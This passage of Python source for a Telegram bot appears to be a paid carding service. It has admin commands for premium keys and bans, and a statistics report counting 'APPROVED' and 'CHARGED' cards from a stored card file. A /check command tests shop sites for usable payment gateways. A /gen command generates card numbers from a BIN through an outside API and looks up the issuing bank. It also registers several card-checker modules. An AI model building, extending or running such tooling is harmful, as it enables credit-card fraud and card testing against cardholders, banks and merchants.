        stats_content = "🔥 BOT STATISTICS REPORT 🔥\n"
        stats_content += "=" * 50 + "\n\n"

        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        stats_content += f"📅 Generated on: {current_time}\n\n"

        stats_content += "👥 USER STATISTICS\n"
        stats_content += "-" * 30 + "\n"

        all_user_ids = set()
        all_user_ids.update(premium_users.keys())
        all_user_ids.update(free_users.keys())
        all_user_ids.update(user_sites.keys())

        total_users = len(all_user_ids)
        total_premium = len(premium_users)
        total_free = total_users - total_premium

        stats_content += f"📊 Total Unique Users: {total_users}\n"
        stats_content += f"💎 Premium Users: {total_premium}\n"
        stats_content += f"🆓 Free Users: {total_free}\n\n"

        if premium_users:
            stats_content += "💎 PREMIUM USERS DETAILS\n"
            stats_content += "-" * 30 + "\n"

            for user_id, user_data in premium_users.items():
                expiry_date = datetime.datetime.fromisoformat(user_data['expiry'])
                current_date = datetime.datetime.now()

                status = "ACTIVE" if current_date <= expiry_date else "EXPIRED"
                days_remaining = (expiry_date - current_date).days if current_date <= expiry_date else 0

                stats_content += f"User ID: {user_id}\n"
                stats_content += f"  Status: {status}\n"
                stats_content += f"  Days Given: {user_data.get('days', 'N/A')}\n"
                stats_content += f"  Added By: {user_data.get('added_by', 'N/A')}\n"
                stats_content += f"  Expires: {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}\n"
                stats_content += f"  Days Remaining: {days_remaining}\n"
                stats_content += "-" * 20 + "\n"

        stats_content += "\n🌐 SITES STATISTICS\n"
        stats_content += "-" * 30 + "\n"

        total_sites_count = sum(len(sites) for sites in user_sites.values())
        users_with_sites = len([uid for uid, sites in user_sites.items() if sites])

        stats_content += f"📈 Total Sites Added: {total_sites_count}\n"
        stats_content += f"👤 Users with Sites: {users_with_sites}\n"

        if user_sites:
            stats_content += f"\nSites per User:\n"
            for user_id, sites in user_sites.items():
                if sites:
                    stats_content += f"  User {user_id}: {len(sites)} sites\n"
                    for site in sites:
                        stats_content += f"    - {site}\n"

        stats_content += f"\n🔑 KEYS STATISTICS\n"
        stats_content += "-" * 30 + "\n"

        total_keys = len(keys_data)
        used_keys = len([k for k, v in keys_data.items() if v.get('used', False)])
        unused_keys = total_keys - used_keys

        stats_content += f"🔢 Total Keys Generated: {total_keys}\n"
        stats_content += f"✅ Used Keys: {used_keys}\n"
        stats_content += f"⏳ Unused Keys: {unused_keys}\n"

        if keys_data:
            stats_content += f"\nKeys Details:\n"
            for key, key_data in keys_data.items():
                status = "USED" if key_data.get('used', False) else "UNUSED"
                used_by = key_data.get('used_by', 'N/A')
                days = key_data.get('days', 'N/A')
                created = key_data.get('created_at', 'N/A')
                used_at = key_data.get('used_at', 'N/A')

                stats_content += f"  Key: {key}\n"
                stats_content += f"    Status: {status}\n"
                stats_content += f"    Days Value: {days}\n"
                stats_content += f"    Created: {created}\n"
                if status == "USED":
                    stats_content += f"    Used By: {used_by}\n"
                    stats_content += f"    Used At: {used_at}\n"
                stats_content += "-" * 15 + "\n"

        stats_content += f"\n👑 ADMIN STATISTICS\n"
        stats_content += "-" * 30 + "\n"
        stats_content += f"🛡️ Total Admins: {len(ADMIN_ID)}\n"
        stats_content += f"Admin IDs: {', '.join(map(str, ADMIN_ID))}\n"

        if os.path.exists(CC_FILE):
            try:
                async with aiofiles.open(CC_FILE, "r", encoding="utf-8") as f:
                    cc_content = await f.read()
                cc_lines = cc_content.strip().split('\n') if cc_content.strip() else []
                approved_cards = len([line for line in cc_lines if 'APPROVED' in line])
                charged_cards = len([line for line in cc_lines if 'CHARGED' in line])

                stats_content += f"\n💳 CARD STATISTICS\n"
                stats_content += "-" * 30 + "\n"
                stats_content += f"📊 Total Processed Cards: {len(cc_lines)}\n"
                stats_content += f"✅ Approved Cards: {approved_cards}\n"
                stats_content += f"💎 Charged Cards: {charged_cards}\n"
            except:
                pass

        stats_content += "\n" + "=" * 50 + "\n"
        stats_content += "📋 END OF REPORT 📋"

        stats_filename = f"bot_stats_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        async with aiofiles.open(stats_filename, "w", encoding="utf-8") as f:
            await f.write(stats_content)

        await event.reply("📊 𝘽𝙤𝙩 𝙨𝙩𝙖𝙩𝙞𝙨𝙩𝙞𝙘𝙨 𝙧𝙚𝙥𝙤𝙧𝙩 𝙜𝙚𝙣𝙚𝙧𝙖𝙩𝙚𝙙!", file=stats_filename)

        os.remove(stats_filename)

    except Exception as e:
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧 𝙜𝙚𝙣𝙚𝙧𝙖𝙩𝙞𝙣𝙜 𝙨𝙩𝙖𝙩𝙨: {e}")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]check'))
async def check_sites(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)

    if access_type == "banned":
        return await event.reply(banned_user_message())

    if not can_access:
        buttons = [
            [Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/+VI845oiGrL4xMzE0")]
        ]
        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙈𝙤𝙙_𝘽𝙮_𝙆𝙖𝙢𝙖𝙡", buttons=buttons)

    check_text = event.raw_text[6:].strip()

    if not check_text:
        buttons = [
            [Button.inline("🔍 𝘾𝙝𝙚𝙘𝙠 𝙈𝙮 𝘿𝘽 𝙎𝙞𝙩𝙚𝙨", b"check_db_sites")]
        ]

        instruction_text = """🔍 **𝙎𝙞𝙩𝙚 𝘾𝙝𝙚𝙘𝙠𝙚𝙧**

𝙄𝙛 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙘𝙝𝙚𝙘𝙠 𝙨𝙞𝙩𝙚𝙨 𝙩𝙝𝙚𝙣 𝙩𝙮𝙥𝙚:

`/check`
`1. https://example.com`
`2. https://site2.com`
`3. https://site3.com`

𝘼𝙣𝙙 𝙞𝙛 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙘𝙝𝙚𝙘𝙠 𝙮𝙤𝙪𝙧 𝘿𝘽 𝙨𝙞𝙩𝙚𝙨 𝙖𝙣𝙙 𝙖𝙙𝙙 𝙬𝙤𝙧𝙠𝙞𝙣𝙜 & 𝙧𝙚𝙢𝙤𝙫𝙚 𝙣𝙤𝙩 𝙬𝙤𝙧𝙠𝙞𝙣𝙜 𝙨𝙞𝙩𝙚𝙨, 𝙘𝙡𝙞𝙘𝙠 𝙗𝙚𝙡𝙤𝙬 𝙗𝙪𝙩𝙩𝙤𝙣:"""

        return await event.reply(instruction_text, buttons=buttons)

    sites_to_check = extract_urls_from_text(check_text)

    if not sites_to_check:
        return await event.reply("❌ 𝙉𝙤 𝙫𝙖𝙡𝙞𝙙 𝙪𝙧𝙡𝙨/𝙙𝙤𝙢𝙖𝙞𝙣𝙨 𝙛𝙤𝙪𝙣𝙙!\n\n💡 𝙀𝙭𝙖𝙢𝙥𝙡𝙚:\n`/check`\n`1. https://example.com`\n`2. site2.com`")

    total_sites_found = len(sites_to_check)
    if len(sites_to_check) > 10:
        sites_to_check = sites_to_check[:10]
        await event.reply(f"```⚠️ 𝙁𝙤𝙪𝙣𝙙 {total_sites_found} 𝙨𝙞𝙩𝙚𝙨, 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙤𝙣𝙡𝙮 𝙛𝙞𝙧𝙨𝙩 10 𝙨𝙞𝙩𝙚𝙨```")

    asyncio.create_task(process_site_check(event, sites_to_check))

async def process_site_check(event, sites):
    """Process site checking in background"""
    total_sites = len(sites)
    checked = 0
    working_sites = []
    dead_sites = []

    status_msg = await event.reply(f"```🔍 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 {total_sites} 𝙨𝙞𝙩𝙚𝙨...```")

    batch_size = 10
    for i in range(0, len(sites), batch_size):
        batch = sites[i:i+batch_size]
        tasks = []

        for site in batch:
            tasks.append(test_single_site(site))

        results = await asyncio.gather(*tasks, return_exceptions=True)

        for j, (site, result) in enumerate(zip(batch, results)):
            checked += 1
            if isinstance(result, Exception):
                result = {"status": "dead", "response": f"Exception: {str(result)}", "site": site, "price": "-"}

            if result["status"] == "working":
                working_sites.append({"site": site, "price": result["price"]})
            else:
                dead_sites.append({"site": site, "price": result["price"]})

            working_count = len(working_sites)
            dead_count = len(dead_sites)
            
            working_sites_text = ""
            if working_sites:
                working_sites_text = "✅ **Working Sites:**\n" + "\n".join(
                    [f"{idx}. `{s['site']}` - {s['price']}" for idx, s in enumerate(working_sites, 1)]
                ) + "\n"
            dead_sites_text = ""
            if dead_sites:
                dead_sites_text = "❌ **Dead Sites:**\n" + "\n".join(
                    [f"{idx}. `{s['site']}` - {s['price']}" for idx, s in enumerate(dead_sites, 1)]
                ) + "\n"

            status_text = (
                f"```🔍 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨...\n\n"
                f"📊 𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨: [{checked}/{total_sites}]\n"
                f"✅ 𝙒𝙤𝙧𝙠𝙞𝙣𝙜: {working_count}\n"
                f"❌ 𝘿𝙚𝙖𝙙: {dead_count}\n\n"
                f"🔄 𝘾𝙪𝙧𝙧𝙚𝙣𝙩: {site}\n"
                f"📝 𝙎𝙩𝙖𝙩𝙪𝙨: {result['status'].upper()}\n"
                f"💰 𝙋𝙧𝙞𝙘𝙚: {result['price']}\n"
                f"```\n"
            )
            if working_sites_text or dead_sites_text:
                status_text += working_sites_text + dead_sites_text

            try:
                await status_msg.edit(status_text)
            except:
                pass

            await asyncio.sleep(0.1)

    final_text = f"""✅ **𝙎𝙞𝙩𝙚 𝘾𝙝𝙚𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚!**

📊 **𝙍𝙚𝙨𝙪𝙡𝙩𝙨:**
🟢 𝙒𝙤𝙧𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨: {len(working_sites)}
🔴 𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨: {len(dead_sites)}

"""
    if working_sites:
        final_text += "✅ **𝙒𝙤𝙧𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨:**\n"
        for idx, site_data in enumerate(working_sites, 1):
            final_text += f"{idx}. `{site_data['site']}` - {site_data['price']}\n"
        final_text += "\n"

    if dead_sites:
        final_text += "❌ **𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨:**\n"
        for idx, site_data in enumerate(dead_sites, 1):
            final_text += f"{idx}. `{site_data['site']}` - {site_data['price']}\n"
        final_text += "\n"

    buttons = []
    if working_sites:
        working_sites_data = "|".join([site_data['site'] for site_data in working_sites])
        buttons.append([Button.inline("➕ 𝘼𝙙𝙙 𝙒𝙤𝙧𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨 𝙩𝙤 𝘿𝘽", f"add_working:{event.sender_id}:{working_sites_data}".encode())])

    try:
        await status_msg.edit(final_text, buttons=buttons)
    except:
        await event.reply(final_text, buttons=buttons)

# Button callback handlers
@client.on(events.CallbackQuery(data=b"check_db_sites"))
async def check_db_sites_callback(event):
    user_id = event.sender_id

    sites = await load_json(SITE_FILE)
    user_sites = sites.get(str(user_id), [])

    if not user_sites:
        return await event.answer("❌ 𝙔𝙤𝙪 𝙝𝙖𝙫𝙚𝙣'𝙩 𝙖𝙙𝙙𝙚𝙙 𝙖𝙣𝙮 𝙨𝙞𝙩𝙚𝙨 𝙮𝙚𝙩!", alert=True)

    await event.answer("🔍 𝙎𝙩𝙖𝙧𝙩𝙞𝙣𝙜 𝘿𝘽 𝙨𝙞𝙩𝙚 𝙘𝙝𝙚𝙘𝙠...", alert=False)

    asyncio.create_task(process_db_site_check(event, user_sites))

async def process_db_site_check(event, user_sites):
    """Check user's DB sites and remove dead ones"""
    user_id = event.sender_id
    total_sites = len(user_sites)
    checked = 0
    working_sites = []
    dead_sites = []

    status_text = f"```🔍 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 {total_sites} 𝘿𝘽 𝙨𝙞𝙩𝙚𝙨...```"
    await event.edit(status_text)

    batch_size = 10
    for i in range(0, len(user_sites), batch_size):
        batch = user_sites[i:i+batch_size]
        tasks = []

        for site in batch:
            tasks.append(test_single_site(site))

        results = await asyncio.gather(*tasks, return_exceptions=True)

        for j, (site, result) in enumerate(zip(batch, results)):
            checked += 1
            if isinstance(result, Exception):
                result = {"status": "dead", "response": f"Exception: {str(result)}", "site": site, "price": "-"}

            if result["status"] == "working":
                working_sites.append(site)
            else:
                dead_sites.append(site)

            working_count = len(working_sites)
            dead_count = len(dead_sites)

            status_text = f"""```🔍 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘿𝘽 𝙎𝙞𝙩𝙚𝙨...

📊 𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨: [{checked}/{total_sites}]
✅ 𝙒𝙤𝙧𝙠𝙞𝙣𝙜: {working_count}
❌ 𝘿𝙚𝙖𝙙: {dead_count}

🔄 𝘾𝙪𝙧𝙧𝙚𝙣𝙩: {site}
📝 𝙎𝙩𝙖𝙩𝙪𝙨: {result['status'].upper()}```"""

            try:
                await event.edit(status_text)
            except:
                pass

            await asyncio.sleep(0.1)

    if dead_sites:
        sites_data = await load_json(SITE_FILE)
        sites_data[str(user_id)] = working_sites
        await save_json(SITE_FILE, sites_data)

    final_text = f"""✅ **𝘿𝘽 𝙎𝙞𝙩𝙚 𝘾𝙝𝙚𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚!**

📊 **𝙍𝙚𝙨𝙪𝙡𝙩𝙨:**
🟢 𝙒𝙤𝙧𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨: {len(working_sites)}
🔴 𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨 (𝙍𝙚𝙢𝙤𝙫𝙚𝙙): {len(dead_sites)}

"""

    if working_sites:
        final_text += "✅ **𝙒𝙤𝙧𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨:**\n"
        for idx, site in enumerate(working_sites, 1):
            final_text += f"{idx}. `{site}`\n"
        final_text += "\n"

    if dead_sites:
        final_text += "❌ **𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨 (𝙍𝙚𝙢𝙤𝙫𝙚𝙙):**\n"
        for idx, site in enumerate(dead_sites, 1):
            final_text += f"{idx}. `{site}`\n"

    try:
        await event.edit(final_text)
    except:
        pass

@client.on(events.CallbackQuery(pattern=rb"add_working:(\d+):(.+)"))
async def add_working_sites_callback(event):
    try:
        match = event.pattern_match
        callback_user_id = int(match.group(1).decode())
        working_sites_data = match.group(2).decode()
        working_sites = working_sites_data.split("|")

        if event.sender_id != callback_user_id:
            return await event.answer("❌ 𝙔𝙤𝙪 𝙘𝙖𝙣 𝙤𝙣𝙡𝙮 𝙖𝙙𝙙 𝙨𝙞𝙩𝙚𝙨 𝙛𝙧𝙤𝙢 𝙮𝙤𝙪𝙧 𝙤𝙬𝙣 𝙘𝙝𝙚𝙘𝙠!", alert=True)

        sites_data = await load_json(SITE_FILE)
        user_sites = sites_data.get(str(callback_user_id), [])

        added_sites = []
        already_exists = []

        for site in working_sites:
            if site not in user_sites:
                user_sites.append(site)
                added_sites.append(site)
            else:
                already_exists.append(site)

        sites_data[str(callback_user_id)] = user_sites
        await save_json(SITE_FILE, sites_data)

        response_parts = []
        if added_sites:
            added_text = f"✅ **𝘼𝙙𝙙𝙚𝙙 {len(added_sites)} 𝙉𝙚𝙬 𝙎𝙞𝙩𝙚𝙨:**\n"
            for site in added_sites:
                added_text += f"• `{site}`\n"
            response_parts.append(added_text)

        if already_exists:
            exists_text = f"⚠️ **{len(already_exists)} 𝙎𝙞𝙩𝙚𝙨 𝘼𝙡𝙧𝙚𝙖𝙙𝙮 𝙀𝙭𝙞𝙨𝙩:**\n"
            for site in already_exists:
                exists_text += f"• `{site}`\n"
            response_parts.append(exists_text)

        if response_parts:
            response_text = "\n".join(response_parts)
            response_text += f"\n📊 **𝙏𝙤𝙩𝙖𝙡 𝙎𝙞𝙩𝙚𝙨 𝙞𝙣 𝙔𝙤𝙪𝙧 𝘿𝘽:** {len(user_sites)}"
        else:
            response_text = "ℹ️ 𝘼𝙡𝙡 𝙨𝙞𝙩𝙚𝙨 𝙖𝙧𝙚 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙞𝙣 𝙮𝙤𝙪𝙧 𝘿𝘽!"

        await event.answer("✅ 𝙎𝙞𝙩𝙚𝙨 𝙥𝙧𝙤𝙘𝙚𝙨𝙨𝙚𝙙!", alert=False)

        current_text = event.message.text
        updated_text = current_text + f"\n\n🔄 **𝙐𝙥𝙙𝙖𝙩𝙚:**\n{response_text}"

        try:
            await event.edit(updated_text)
        except:
            await event.respond(response_text)

    except Exception as e:
        await event.answer(f"❌ 𝙀𝙧𝙧𝙤𝙧: {str(e)}", alert=True)

@client.on(events.NewMessage(pattern='/unauth'))
async def unauth_user(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("🚫 𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙!")

    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: /unauth {user_id}")

        user_id = int(parts[1])

        if not await is_premium_user(user_id):
            return await event.reply(f"❌ 𝙐𝙨𝙚𝙧 {user_id} 𝙙𝙤𝙚𝙨 𝙣𝙤𝙩 𝙝𝙖𝙫𝙚 𝙥𝙧𝙚𝙢𝙞𝙪𝙢 𝙖𝙘𝙘𝙚𝙨𝙨!")

        success = await remove_premium_user(user_id)

        if success:
            await event.reply(f"✅ 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝙖𝙘𝙘𝙚𝙨𝙨 𝙧𝙚𝙢𝙤𝙫𝙚𝙙 𝙛𝙤𝙧 𝙪𝙨𝙚𝙧 {user_id}!")

            try:
                await client.send_message(user_id, f"⚠️ 𝙔𝙤𝙪𝙧 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝘼𝙘𝙘𝙚𝙨𝙨 𝙃𝙖𝙨 𝘽𝙚𝙚𝙣 𝙍𝙚𝙫𝙤𝙠𝙚𝙙!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙣𝙤 𝙡𝙤𝙣𝙜𝙚𝙧 𝙪𝙨𝙚 𝙩𝙝𝙚 𝙗𝙤𝙩 𝙞𝙣 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙘𝙝𝙖𝙩.\n\n𝙁𝙤𝙧 𝙞𝙣𝙦𝙪𝙞𝙧𝙞𝙚𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙈𝙤𝙙_𝘽𝙮_𝙆𝙖𝙢𝙖𝙡")
            except:
                pass
        else:
            await event.reply(f"❌ 𝙁𝙖𝙞𝙡𝙚𝙙 𝙩𝙤 𝙧𝙚𝙢𝙤𝙫𝙚 𝙖𝙘𝙘𝙚𝙨𝙨 𝙛𝙤𝙧 𝙪𝙨𝙚𝙧 {user_id}")

    except ValueError:
        await event.reply("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙪𝙨𝙚𝙧 𝙄𝘿!")
    except Exception as e:
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

@client.on(events.NewMessage(pattern='/ban'))
async def ban_user_command(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("🚫 𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙!")

    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: /ban {user_id}")

        user_id = int(parts[1])

        if await is_banned_user(user_id):
            return await event.reply(f"❌ 𝙐𝙨𝙚𝙧 {user_id} 𝙞𝙨 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙗𝙖𝙣𝙣𝙚𝙙!")

        await remove_premium_user(user_id)
        await ban_user(user_id, event.sender_id)

        await event.reply(f"✅ 𝙐𝙨𝙚𝙧 {user_id} 𝙝𝙖𝙨 𝙗𝙚𝙚𝙣 𝙗𝙖𝙣𝙣𝙚𝙙!")

        try:
            await client.send_message(user_id, f"🚫 𝙔𝙤𝙪 𝙃𝙖𝙫𝙚 𝘽𝙚𝙚𝙣 𝘽𝙖𝙣𝙣𝙚𝙙!\n\n𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤 𝙡𝙤𝙣𝙜𝙚𝙧 𝙖𝙗𝙡𝙚 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙤𝙧 𝙜𝙧𝙤𝙪𝙥 𝙘𝙝𝙖𝙩.\n\n𝙁𝙤𝙧 𝙖𝙥𝙥𝙚𝙖𝙡, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙈𝙤𝙙_𝘽𝙮_𝙆𝙖𝙢𝙖𝙡")
        except:
            pass

    except ValueError:
        await event.reply("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙪𝙨𝙚𝙧 𝙄𝘿!")
    except Exception as e:
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

@client.on(events.NewMessage(pattern='/unban'))
async def unban_user_command(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("🚫 𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙!")

    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: /unban {user_id}")

        user_id = int(parts[1])

        if not await is_banned_user(user_id):
            return await event.reply(f"❌ 𝙐𝙨𝙚𝙧 {user_id} 𝙞𝙨 𝙣𝙤𝙩 𝙗𝙖𝙣𝙣𝙚𝙙!")

        success = await unban_user(user_id)

        if success:
            await event.reply(f"✅ 𝙐𝙨𝙚𝙧 {user_id} 𝙝𝙖𝙨 𝙗𝙚𝙚𝙣 𝙪𝙣𝙗𝙖𝙣𝙣𝙚𝙙!")

            try:
                await client.send_message(user_id, f"🎉 𝙔𝙤𝙪 𝙃𝙖𝙫𝙚 𝘽𝙚𝙚𝙣 𝙐𝙣𝙗𝙖𝙣𝙣𝙚𝙙!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙣𝙤𝙬 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙖𝙜𝙖𝙞𝙣 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥𝙨.\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙮𝙤𝙪 𝙬𝙞𝙡𝙡 𝙣𝙚𝙚𝙙 𝙩𝙤 𝙥𝙪𝙧𝙘𝙝𝙖𝙨𝙚 𝙖 𝙣𝙚𝙬 𝙠𝙚𝙮.")
            except:
                pass
        else:
            await event.reply(f"❌ 𝙁𝙖𝙞𝙡𝙚𝙙 𝙩𝙤 𝙪𝙣𝙗𝙖𝙣 𝙪𝙨𝙚𝙧 {user_id}")

    except ValueError:
        await event.reply("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙪𝙨𝙚𝙧 𝙄𝘿!")
    except Exception as e:
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

# --- CC Generator Command ---
@client.on(events.NewMessage(pattern=r'^[/.!]gen'))
async def gen_command(event):
    """CC Generator command"""
    try:
        # Extract BIN from command
        text = event.raw_text.split(maxsplit=1)
        if len(text) < 2:
            return await event.reply("⚠️ **Wrong Format!**\n\n**Command:** `/gen <bin>`\n**Example:** `/gen 424242`\n\n🔢 Provide a 6-16 digit BIN")
        
        bin_input = text[1].strip()
        
        # Extract BIN number
        import re
        match = re.match(r'(\d{6,16})', bin_input)
        if not match:
            return await event.reply("⚠️ **Invalid BIN!**\n\nProvide a valid 6-16 digit BIN number")
        
        bin_number = match.group(1)
        if len(bin_number) == 6:
            bin_number = bin_number.ljust(16, 'x')
        
        # Loading message
        loading_msg = await event.reply("🔢 **Generating Cards...**\n\nPlease wait...")
        
        # Generate CC
        url = f"https://drlabapis.onrender.com/api/ccgenerator?bin={bin_number}&count=10"
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=10) as response:
                if response.status == 200:
                    raw_text = await response.text()
                    cc_data = raw_text.strip().split("\n")
                else:
                    await loading_msg.delete()
                    return await event.reply(f"❌ **API Error:** {response.status}")
        
        # Get BIN info
        url = f"https://drlabapis.onrender.com/api/bin?bin={bin_number[:6]}"
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=10) as response:
                if response.status == 200:
                    bin_data = await response.json()
                    country_name = bin_data.get('country', 'NOT FOUND').upper()
                    
                    # Country flags
                    country_flags = {
                        "FRANCE": "🇫🇷", "UNITED STATES": "🇺🇸", "BRAZIL": "🇧🇷", "NAMIBIA": "🇳🇦",
                        "INDIA": "🇮🇳", "GERMANY": "🇩🇪", "THAILAND": "🇹🇭", "MEXICO": "🇲🇽", "RUSSIA": "🇷🇺",
                        "UNITED KINGDOM": "🇬🇧", "CANADA": "🇨🇦", "AUSTRALIA": "🇦🇺", "JAPAN": "🇯🇵",
                        "CHINA": "🇨🇳", "SOUTH KOREA": "🇰🇷", "ITALY": "🇮🇹", "SPAIN": "🇪🇸",
                    }
                    
                    bin_info = {
                        "bank": bin_data.get('issuer', 'NOT FOUND').upper(),
                        "card_type": bin_data.get('type', 'NOT FOUND').upper(),
                        "network": bin_data.get('scheme', 'NOT FOUND').upper(),
                        "tier": bin_data.get('tier', 'NOT FOUND').upper(),
                        "country": country_name,
                        "flag": country_flags.get(country_name, "🏳️")
                    }
                else:
                    await loading_msg.delete()
                    return await event.reply(f"❌ **BIN Lookup Error:** {response.status}")
        
        # Format response
        if not cc_data:
            await loading_msg.delete()
            return await event.reply("❌ **No cards generated**")
        
        formatted_text = f"**𝗕𝗜𝗡** ⇾ `{bin_number[:6]}`\n"
        formatted_text += f"**𝗔𝗺𝗼𝘂𝗻𝘁** ⇾ `{len(cc_data)}`\n\n"
        for card in cc_data:
            formatted_text += f"`{card.upper()}`\n"
        formatted_text += f"\n**𝗜𝗻𝗳𝗼:** {bin_info.get('card_type', 'NOT FOUND')} - {bin_info.get('network', 'NOT FOUND')} ({bin_info.get('tier', 'NOT FOUND')})\n"
        formatted_text += f"**𝐈𝐬𝐬𝐮𝐞𝐫:** {bin_info.get('bank', 'NOT FOUND')}\n"
        formatted_text += f"**𝗖𝗼𝘂𝗻𝘁𝗿𝘆:** {bin_info.get('country', 'NOT FOUND')} {bin_info.get('flag', '🏳️')}"
        
        await loading_msg.delete()
        await event.reply(formatted_text)
        
    except Exception as e:
        await event.reply(f"❌ **Error:** {str(e)}")

async def main():
    await initialize_files()

    # Create a wrapper for get_cc_limit that can be used by external modules
    def get_cc_limit_wrapper(access_type, user_id=None):
        return get_cc_limit(access_type, user_id)
    
    utils_for_all = {
        'can_use': can_use,
        'banned_user_message': banned_user_message,
        'access_denied_message_with_button': access_denied_message_with_button,
        'channel_join_required_message': channel_join_required_message,
        'extract_card': extract_card,
        'extract_all_cards': extract_all_cards,
        'get_bin_info': get_bin_info,
        'save_approved_card': save_approved_card,
        'get_cc_limit': get_cc_limit_wrapper,
        'pin_charged_message': pin_charged_message,
        'ADMIN_ID': ADMIN_ID,
        'load_json': load_json,
        'save_json': save_json
    }

    # Register handlers from all command files
    register_st_handlers(client, utils_for_all)
    register_stc_handlers(client, utils_for_all)
    register_bt_handlers(client, utils_for_all)
    register_au_handlers(client, utils_for_all)
    register_py_handlers(client, utils_for_all)
    register_sq_handlers(client, utils_for_all)
    register_chk_handlers(client, utils_for_all)
    # register_br_handlers(client, utils_for_all)

    print("𝘽𝙊𝙏 𝙍𝙐𝙉𝙉𝙄𝙉𝙂 💨")
    await client.start(bot_token=BOT_TOKEN)
    await client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
